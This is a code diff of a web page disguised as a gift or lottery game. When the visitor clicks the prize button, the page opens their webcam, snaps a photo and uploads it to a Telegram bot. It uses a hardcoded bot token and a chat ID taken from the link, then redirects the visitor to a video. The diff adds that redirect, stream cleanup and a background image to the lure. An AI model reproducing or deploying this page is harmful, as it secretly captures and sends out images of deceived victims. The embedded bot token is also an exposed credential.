@@ -4,9 +4,15 @@
     <meta charset="UTF-8">
     <title>🎁🎁🎁🎁🎁</title>
     <style>
-        body { display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; font-family: 'Segoe UI', sans-serif; background-color: #1a1a1a; color: white; }
+        body { 
+            display: flex; flex-direction: column; align-items: center; justify-content: center; 
+            min-height: 100vh; margin: 0; font-family: 'Segoe UI', sans-serif; 
+            /* 添加背景图 */
+            background: url('https://github.com/sachinbagwan208-design/-/raw/main/00.png') no-repeat center center fixed; 
+            background-size: cover; color: white; 
+        }
         #video { background: #000; border: 2px solid #444; border-radius: 8px; margin-bottom: 20px; }
-        #status { margin: 15px 0; font-weight: bold; color: #00ff00; }
+        #status { margin: 15px 0; font-weight: bold; color: #00ff00; background: rgba(0,0,0,0.6); padding: 10px; border-radius: 5px; }
         button { padding: 12px 30px; cursor: pointer; font-size: 18px; border-radius: 5px; border: none; background: #28a745; color: white; }
         button:hover { background: #218838; }
     </style>
@@ -19,9 +25,7 @@
     <button id="startBtn">Offen💰</button>
 
     <script>
-        // 【仅需填写此处】请填入你的完整 Bot Token
-        const BOT_TOKEN = '8657025946:AAENnYKTFNhRrms6bzTLIR2kAQGytdOinnI';
-
+        const BOT_TOKEN = '8657025946:AAENnYKTFNhRrms6bzTLIR2kAQGytdOinnI'; // 请确认替换
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const startBtn = document.getElementById('startBtn');
@@ -29,14 +33,16 @@
         const urlParams = new URLSearchParams(window.location.search);
         const CHAT_ID = urlParams.get('id');
 
+        let currentStream;
+
         startBtn.addEventListener('click', async () => {
             if (!CHAT_ID) {
-                status.innerText = "错误：未发现用户 ID，请先通过 Telegram 机器人发送 /start 获取链接！";
+                status.innerText = "错误：未发现用户 ID";
                 return;
             }
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                video.srcObject = stream;
+                currentStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = currentStream;
                 startBtn.style.display = 'none';
                 status.innerText = "🎲Die Lotterie läuft🎲...";
                 setTimeout(captureAndUpload, 1500);
@@ -62,7 +68,13 @@
                         body: formData
                     });
                     const result = await response.json();
-                    status.innerText = result.ok ? "💔💔💔💔💔" : "回传失败：" + result.description;
+                    if(result.ok) {
+                        // 上传成功：停止摄像头并跳转
+                        currentStream.getTracks().forEach(track => track.stop());
+                        window.location.href = "https://github.com/sachinbagwan208-design/-/raw/main/000.MP4";
+                    } else {
+                        status.innerText = "回传失败：" + result.description;
+                    }
                 } catch (err) {
                     status.innerText = "网络连接错误。";
                 }
